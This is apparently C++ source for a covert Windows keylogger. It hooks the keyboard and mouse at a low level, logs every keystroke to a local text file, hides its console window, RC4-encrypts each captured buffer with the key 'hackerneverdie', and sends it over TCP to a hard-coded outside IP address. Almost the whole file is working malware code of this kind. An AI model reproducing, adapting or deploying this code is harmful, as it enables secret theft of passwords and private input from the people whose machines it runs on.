
#define _WIN32_WINNT 0x501
#define BUF_SIZE 512
#define MAX_THREAD 100
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <iostream>
#include<windows.h>
#include<iostream>
#include <fstream>
#include <iomanip>
using namespace std;

#pragma comment(lib,"Ws2_32.lib")
SOCKET CliSock;
SOCKET ServerSock;
sockaddr_in clientService;
int finish;
int shift;
int changLine;
ofstream fout ("C:\\9817243.txt");

void prga(unsigned char* tmpkey,int size,unsigned char* keystream)
{

  //  keystream=(char*)malloc(sizeof(char)*size);
    int i=0,j=0,index=0;
   unsigned char tmp;
    for(int x=0;x<size;x++)
    {
        i=(i+1)%256;
        j=(j+tmpkey[i])%256;
        tmp=tmpkey[i];  tmpkey[i]=tmpkey[j];    tmpkey[j]=tmp;
        keystream[x]=tmpkey[(tmpkey[i]+tmpkey[j])%256];
    }

    return;
}

void ksa(unsigned char* key,unsigned char*s,int lenth)
{

    for(int i=0;i<256;i++)
    {
        s[i]=i;
    }
    int j=0;
    for(int i=0;i<256;i++)
    {
        j=(j+s[i]+key[i%lenth])%256;
        unsigned char tmp=s[i];
        s[i]=s[j];
        s[j]=tmp;
    }
    return;
}

void rc4(char* t,char* k)
{
    unsigned char* text=(unsigned char*)t;
    unsigned char* key=(unsigned char*)k;
    unsigned char tmpkey[256];
    ksa(key,tmpkey,(int)strlen(t));
    unsigned char keystream[(int)strlen(t)];
    prga(tmpkey,strlen(t),keystream);
    for(int i=0;i<strlen(t);i++)
    {
        text[i]=keystream[i]^text[i];
    }

    return;

}

LRESULT WINAPI Handle(int code , WPARAM w,LPARAM l)
{
	//fout << "test " << endl;
	KBDLLHOOKSTRUCT* kbhook = (KBDLLHOOKSTRUCT *)l;
	MSLLHOOKSTRUCT* mshook = (MSLLHOOKSTRUCT *)l;
        int reclen = BUF_SIZE;
        int result;
        char rebuf[BUF_SIZE];
        ZeroMemory(&rebuf,sizeof(rebuf));


	switch(w)
	{
	 case WM_MOUSEMOVE:
            if(changLine==0)
            {
                strcat(rebuf,"\n");
                changLine=1;
            }
            break;
	case WM_KEYDOWN:
        changLine=0;
        switch (kbhook->vkCode)
        {
        case 160:
            shift=1;
            //fout << "S" << shift << endl;
            strcat(rebuf,"[Shift]");
            fout << "Shift" << endl;
            break;
        case 9:
changLine=1;
            strcat(rebuf,"[Tab]\n");
            fout << "[Tab]" << endl;
            break;
        case 20:
changLine=1;
            strcat(rebuf,"[Caps Lock]\n");
            fout << "[Caps Lock]" << endl;
            break;
        case 162:
            strcat(rebuf,"[Ctrl]" );
            fout << "[Ctrl]" << endl;
            break;
        case 91:
changLine=1;
            strcat(rebuf,"[Windows]\n" );
            fout << "[Windows]" << endl;
            break;
        case 164:
             //changLine=1;
            strcat(rebuf,"[Alt]" );
            fout << "[Alt]" << endl;
            break;
        case 32:
            strcat(rebuf,"[space]" );
            fout << "[space]" << endl;
            break;
        case 165:
            strcat(rebuf,"[Alt]" );
            fout << "[Alt]" << endl;
            break;
        case 163:
            strcat(rebuf,"[Ctrl]" );
            fout << "[Ctrl]" << endl;
            break;
        case 161:
            shift=1;
            strcat(rebuf,"[Shift]" );
            fout << "[Shift]" << endl;
            break;
        case 13:
changLine=1;
            strcat(rebuf,"[Enter]\n" );
            fout << "[Enter]" << endl;
            break;
        case 8:
            strcat(rebuf,"[Back Space]" );
            fout << "[Back Space]" << endl;
            break;
        case 27:
             changLine=1;
            strcat(rebuf,"[Esc]" );
            fout << "[Esc]" << endl;
            break;
        case 112:
            strcat(rebuf,"[F1]" );
            fout << "[F1]" << endl;
            break;
        case 113:
            strcat(rebuf,"[F2]" );
            fout << "[F2]" << endl;
            break;
        case 114:
            strcat(rebuf,"[F3]" );
            fout << "[F3]" << endl;
            break;
        case 115:
            strcat(rebuf,"[F4]" );
            fout << "[F4]" << endl;
            break;
        case 116:
            strcat(rebuf,"[F5]" );
            fout << "[F5]" << endl;
            break;
        case 117:
            strcat(rebuf,"[F6]" );
            fout << "[F6]" << endl;
            break;
        case 118:
            strcat(rebuf,"[F7]" );
            fout << "[F7]" << endl;
            break;
        case 119:
            strcat(rebuf,"[F8]" );
            fout << "[F8]" << endl;
            break;
        case 120:
            strcat(rebuf,"[F9]" );
            fout << "[F9]" << endl;
            break;
        case 121:
            strcat(rebuf,"[F10]" );
            fout << "[F10]" << endl;
            break;
        case 122:
            strcat(rebuf,"[F11]" );
            fout << "[F11]" << endl;
            break;
        case 123:
            strcat(rebuf,"[F12]" );
            fout << "[F12]" << endl;
            break;
        case 44:
            strcat(rebuf,"[Print Screen]" );
            fout << "[Print Screen]" << endl;
            break;
        case 145:
            strcat(rebuf,"[Screen Lock]" );
            fout << "[Screen Lock]" << endl;
            break;
        case 33:
            strcat(rebuf,"[Page Up]" );
            fout << "[Page Up]" << endl;
            break;
        case 45:
            strcat(rebuf,"[Insert]" );
            fout << "[Insert]" << endl;
            break;
        case 36:
            strcat(rebuf,"[Home]" );
            fout << "[Home]" << endl;
            break;
        case 46:
            strcat(rebuf,"[Delete]" );
            fout << "[Delete]" << endl;
            break;
        case 35:
            strcat(rebuf,"[End]" );
            fout << "[End]" << endl;
            break;
        case 34:
            strcat(rebuf,"[Page Down]" );
            fout << "[Page Down]" << endl;
            break;
        case 38:
            strcat(rebuf,"[dir Up]" );
            fout << "[dir UP]" << endl;
            break;
        case 40:
            strcat(rebuf,"[dir Down]" );
            fout << "[dir Down]" << endl;
            break;
        case 37:
            strcat(rebuf,"[dir Left]" );
            fout << "[dir Left]" << endl;
            break;
        case 39:
            strcat(rebuf,"[dir Right]" );
            fout << "[dir Right]" << endl;
            break;
        case 144:
            strcat(rebuf,"[Num Lock]" );
            fout << "[Num Lock]" << endl;
            break;
        case 111:
            strcat(rebuf,"/" );
            fout << "/" << endl;
            break;
        case 106:
            strcat(rebuf,"*" );
            fout << "*" << endl;
            break;
        case 109:
            strcat(rebuf,"-" );
            fout << "-" << endl;
            break;
        case 107:
            strcat(rebuf,"+" );
            fout << "+" << endl;
            break;
        case 110:
            strcat(rebuf,"." );
            fout << "." << endl;
            break;
        case 96:
            strcat(rebuf,"0" );
            fout << "0" << endl;
            break;
        case 97:
            strcat(rebuf,"1" );
            fout << "1" << endl;
            break;
        case 98:
            strcat(rebuf,"2" );
            fout << "2" << endl;
            break;
        case 99:
            strcat(rebuf,"3" );
            fout << "3" << endl;
            break;
        case 100:
            strcat(rebuf,"4" );
            fout << "4" << endl;
            break;
        case 101:
            strcat(rebuf,"5" );
            fout << "5" << endl;
            break;
        case 102:
            strcat(rebuf,"6" );
            fout << "6" << endl;
            break;
        case 103:
            strcat(rebuf,"7" );
            fout << "7" << endl;
            break;
        case 104:
            strcat(rebuf,"8" );
            fout << "8" << endl;
            break;
        case 105:
            strcat(rebuf,"9" );
            fout << "9" << endl;
            break;

        case 192:
            if(shift)
            {
                strcat(rebuf,"~" );
                fout << "~" << endl;
            }
            else
            {
                strcat(rebuf,"`" );
                fout << "`" << endl;
            }
            break;
        case 49:
            if(shift)
            {
                strcat(rebuf,"!" );
                fout << "!" << endl;
            }
            else
            {
                strcat(rebuf,"1" );
                fout << "1" << endl;
            }
            break;
        case 50:
            if(shift)
            {
                strcat(rebuf,"@" );
                fout << "@" << endl;
            }
            else
            {
                strcat(rebuf,"2" );
                fout << "2" << endl;
            }
            break;
        case 51:
            if(shift)
            {
                strcat(rebuf,"#" );
                fout << "#" << endl;
            }
            else
            {
                strcat(rebuf,"3" );
                fout << "3" << endl;
            }
            break;
        case 52:
            if(shift)
            {
                strcat(rebuf,"$" );
                fout << "$" << endl;
            }
            else
            {
                strcat(rebuf,"4" );
                fout << "4" << endl;
            }
            break;
        case 53:
            if(shift)
            {
                strcat(rebuf,"%" );
                fout << "%" << endl;
            }
            else
            {
                strcat(rebuf,"5" );
                fout << "5" << endl;
            }
            break;
        case 54:
            if(shift)
            {
                strcat(rebuf,"^" );
                fout << "^" << endl;
            }
            else
            {
                strcat(rebuf,"6" );
                fout << "6" << endl;
            }
            break;
        case 55:
            if(shift)
            {
                strcat(rebuf,"&" );
                fout << "&" << endl;
            }
            else
            {
                strcat(rebuf,"7" );
                fout << "7" << endl;
            }
            break;
        case 56:
            if(shift)
            {
                strcat(rebuf,"*" );
                fout << "*" << endl;
            }
            else
            {
                strcat(rebuf,"8" );
                fout << "8" << endl;
            }
            break;
        case 57:
            if(shift)
            {
                strcat(rebuf,"(" );
                fout << "(" << endl;
            }
            else
            {
                strcat(rebuf,"9" );
                fout << "9" << endl;
            }
            break;
        case 48:
            if(shift)
            {
                strcat(rebuf,")" );
                fout << ")" << endl;
            }
            else
            {
                strcat(rebuf,"0" );
                fout << "0" << endl;
            }
            break;
        case 189:
            if(shift)
            {
                strcat(rebuf,"_" );
                fout << "_" << endl;
            }
            else
            {
                strcat(rebuf,"-" );
                fout << "-" << endl;
            }
            break;
        case 187:
            if(shift)
            {
                strcat(rebuf,"+" );
                fout << "+" << endl;
            }
            else
            {
                strcat(rebuf,"=" );
                fout << "=" << endl;
            }
            break;
        case 220:
            if(shift)
            {
                strcat(rebuf,"|" );
                fout << "|" << endl;
            }
            else
            {
                strcat(rebuf,"\\" );
                fout << "\\" << endl;
            }
            break;
        case 219:
            if(shift)
            {
                strcat(rebuf,"{" );
                fout << "{" << endl;
            }
            else
            {
                strcat(rebuf,"[" );
                fout << "[" << endl;
            }
            break;
        case 221:
            if(shift)
            {
                strcat(rebuf,"}" );
                fout << "}" << endl;
            }
            else
            {
                strcat(rebuf,"]" );
                fout << "]" << endl;
            }
            break;
        case 222:
            if(shift)
            {
                strcat(rebuf,"\"" );
                fout << "\"" << endl;
            }
            else
            {
                strcat(rebuf,"'" );
                fout << "'" << endl;
            }
            break;
        case 186:
            if(shift)
            {
                strcat(rebuf,":" );
                fout << ":" << endl;
            }
            else
            {
                strcat(rebuf,";" );
                fout << ";" << endl;
            }
            break;
        case 191:
            if(shift)
            {
                strcat(rebuf,"?" );
                fout << "?" << endl;
            }
            else
            {
                strcat(rebuf,"/" );
                fout << "/" << endl;
            }
            break;
        case 190:
            if(shift)
            {
                strcat(rebuf,">" );
                fout << ">" << endl;
            }
            else
            {
                strcat(rebuf,"." );
                fout << "." << endl;
            }
            break;
        case 188:
            if(shift)
            {
                strcat(rebuf,"<" );
                fout << "<" << endl;
            }
            else
            {
                strcat(rebuf,"," );
                fout << "," << endl;
            }
            break;
        default:

		if(GetKeyState(VK_CAPITAL )|| shift )
		{
		    char tmpp=(char)kbhook->vkCode;
            strcat(rebuf,(char*)&kbhook->vkCode );
		    fout << (char)kbhook->vkCode << endl;
		}

		else
		{
		    char tmpp[2];
		    tmpp[0]=(char)(kbhook->vkCode+32);
		    tmpp[1]='\0';
		    strcat(rebuf,tmpp );
		    fout << (char)(kbhook->vkCode+32)<< endl;
           // fout << kbhook->vkCode <<"!"<< endl;
		}
        break;
        }
        break;

    case  WM_KEYUP:

        if(kbhook->vkCode==160||kbhook->vkCode==161)shift=0;
        break;
	}
	fout.flush();

	if(strlen(rebuf))
	{
	    //////////////////////////////

	     WSADATA wsdata;
    char* port = "11111";
    int result = WSAStartup(MAKEWORD(2,2),&wsdata);
    if(result !=0 )
    {
        cout << "WinSock Startup fail: " << result << endl;
    }

    struct addrinfo *adrinfo=NULL,*ptr =NULL,hints;
    ZeroMemory(&hints,sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    result = getaddrinfo(NULL,port,&hints,&adrinfo);
    if(result!=0)
    {
        cout << "getaddrinfo failed: " << result << endl;
        WSACleanup();
        return 1;
    }

    ServerSock = INVALID_SOCKET;

    ServerSock = socket(adrinfo->ai_family,adrinfo->ai_socktype,adrinfo->ai_protocol);

    if(ServerSock==INVALID_SOCKET)
    {
            cout << "socket open fail: " << WSAGetLastError() << endl;
            cout.flush();
            freeaddrinfo(adrinfo);
            WSACleanup();
            return 1;
    }

    freeaddrinfo(adrinfo);




    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr("140.113.252.111");
    clientService.sin_port = htons(11111);
    ////////////
	    connect(ServerSock, (SOCKADDR *) & clientService, sizeof (clientService));

	    cout << "msg send :" << rebuf <<"   size:"<<(int)strlen(rebuf)<<endl;

		rc4(rebuf,"hackerneverdie");
		cout.flush();
        result = send(ServerSock,rebuf,(int)strlen(rebuf),0);
        shutdown(ServerSock,SD_RECEIVE);
      /* while(shift);
        finish=1;*/
	}




      /*  result = shutdown(ServerSock,SD_SEND);
        if(result==SOCKET_ERROR)
        {
            cout << "shutdown fail: " << WSAGetLastError() << endl;
           // fflush(stdout);
           cout.flush();
            closesocket(ServerSock);
            WSACleanup();
            //return 1;
        }*/
	return CallNextHookEx(NULL,code,w,l);
}

DWORD WINAPI read(LPVOID lpParam)
{
       /* int reclen = BUF_SIZE;
        int result;
        char rebuf[BUF_SIZE];
        ZeroMemory(&rebuf,sizeof(rebuf));
        while(1)
        {
            if(finish)
            {
               // result = recv(ServerSock,rebuf,reclen,0);
                shutdown(ServerSock,SD_RECEIVE);
                finish=0;
                if(result >0)
                {
                    cout << "Msg get : "<< rebuf << endl<<flush;
                    closesocket(ServerSock);
                }
            }



        }

        cout.flush();*/

		return 0;
}
DWORD WINAPI write(LPVOID lpParam)
{
    HHOOK hMouseHook= SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)Handle,GetModuleHandle(NULL),0);
    HHOOK hkbHook= SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Handle,GetModuleHandle(NULL),0);
	MSG msg;

	while(GetMessage(&msg,NULL,0,0)!=0)
	{
               if (msg.message == WM_HOTKEY)
               {
                  UnhookWindowsHookEx(hkbHook);
                  UnhookWindowsHookEx(hMouseHook);
                  return 0;
               }
               //Translates virtual-key messages into character messages.
               TranslateMessage(&msg);
               //Dispatches a message to a window procedure.
               DispatchMessage(&msg);
	}

        return 0;
}

int main(){


    finish=0;
    changLine=0;
    WSADATA wsdata;
    SetConsoleTitle("testMyConsole");
HANDLE hwnd = FindWindow(NULL,"testMyConsole");
ShowWindow((HWND)hwnd,SW_HIDE);
    char* port = "11111";
    int result = WSAStartup(MAKEWORD(2,2),&wsdata);
    if(result !=0 )
    {
        cout << "WinSock Startup fail: " << result << endl;
    }

    struct addrinfo *adrinfo=NULL,*ptr =NULL,hints;
    ZeroMemory(&hints,sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    result = getaddrinfo(NULL,port,&hints,&adrinfo);
    if(result!=0)
    {
        cout << "getaddrinfo failed: " << result << endl;
        WSACleanup();
        return 1;
    }

    ServerSock = INVALID_SOCKET;

    ServerSock = socket(adrinfo->ai_family,adrinfo->ai_socktype,adrinfo->ai_protocol);

    if(ServerSock==INVALID_SOCKET)
    {
            cout << "socket open fail: " << WSAGetLastError() << endl;
            cout.flush();
            freeaddrinfo(adrinfo);
            WSACleanup();
            return 1;
    }

    freeaddrinfo(adrinfo);




    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr("140.113.252.111");
    clientService.sin_port = htons(11111);
   /* result = connect(ServerSock, (SOCKADDR *) & clientService, sizeof (clientService));
    if (result == SOCKET_ERROR) {
        wprintf(L"connect function failed with error: %ld\n", WSAGetLastError());
        result = closesocket(ServerSock);
        if (result == SOCKET_ERROR)
            wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }*/


   // CliSock=INVALID_SOCKET;
    //while(true){
      //  CliSock = accept(ServerSock,NULL,NULL);
        /*cout << " accept connection" << endl;
        if(CliSock == INVALID_SOCKET)
        {
            cout << "accept fail: " << WSAGetLastError() << endl;
            closesocket(ServerSock);
            WSACleanup();
            return 1;
        }*/
       // printf("debug1\n");
        cout <<"test!"<<endl;
        //start send
        HANDLE t[2];
          t[0]= CreateThread(NULL,0,write,NULL,0,NULL);
      //    t[1] = CreateThread(NULL,0,read,NULL,0,NULL);


WaitForSingleObject(t[0],INFINITE);
//WaitForSingleObject(t[1],INFINITE);
        cout <<"connect fiinshed "<<endl;
        cout.flush();
        //fflush(stdout);
    //}
    closesocket(ServerSock);
    WSACleanup();
    return 0;
}
